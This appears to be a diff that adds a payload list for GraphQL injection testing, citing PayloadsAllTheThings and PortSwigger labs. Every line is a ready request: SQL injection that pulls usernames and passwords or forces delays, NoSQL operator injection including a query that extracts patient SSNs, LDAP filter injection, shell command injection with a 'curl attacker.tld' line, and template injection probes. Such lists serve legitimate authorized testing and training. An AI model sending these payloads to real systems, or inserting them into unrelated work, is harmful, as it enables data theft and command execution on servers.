@@ -1,0 +1,35 @@
+# GraphQL SQL/NoSQL injection through resolvers — PAT + PortSwigger backend injection labs
+# Authorized testing only.
+
+# --- SQLi: single quote in argument ---
+{"query":"{ bacon(id: \"1'\") { id type price } }"}
+{"query":"query { user(name: \"patt';SELECT pg_sleep(5);--'\") { id email } }"}
+{"query":"query { user(id: \"1' OR '1'='1\") { id email password } }"}
+{"query":"query { product(sku: \"' UNION SELECT null,username,password FROM users--\") { name price } }"}
+
+# --- SQLi via variables ---
+{"query":"query($id:String!){ user(id:$id){ id email } }","variables":{"id":"1' OR '1'='1--"}}
+{"query":"query($q:String!){ search(query:$q){ id title } }","variables":{"q":"' OR 1=1--"}}
+
+# --- NoSQL injection (Mongo-style in GraphQL args) ---
+{"query":"{ doctors(options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\", search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\") { firstName lastName id patients { ssn } } }"}
+
+# --- JSON type smuggling in variables ---
+{"query":"query($filter:JSON){ users(filter:$filter){ id email } }","variables":{"filter":{"$where":"this.password.length > 0"}}}
+{"query":"query($filter:JSON){ users(filter:$filter){ id email } }","variables":{"filter":{"username":{"$ne":null}}}}
+
+# --- Operator injection in search ---
+{"query":"query { search(q: \"{\\\"$gt\\\":\\\"\\\"}\") { id title } }"}
+{"query":"query { users(filter: \"{\\\"role\\\":{\\\"$regex\\\":\\\".*\\\"}}\") { id role } }"}
+
+# --- LDAP/filter injection patterns in GraphQL string args ---
+{"query":"query { users(filter: \"*)(uid=*))(|(uid=*\") { id username } }"}
+{"query":"query { findUser(query: \"admin)(|(password=*)\") { id } }"}
+
+# --- Command injection via backend shell-out (rare resolver bugs) ---
+{"query":"query { ping(host: \"127.0.0.1; id\") { status } }"}
+{"query":"query { export(format: \"csv; curl attacker.tld\") { url } }"}
+
+# --- SSTI through template-backed fields ---
+{"query":"query { render(template: \"{{7*7}}\") { output } }"}
+{"query":"query { emailPreview(body: \"${7*7}\") { html } }"}
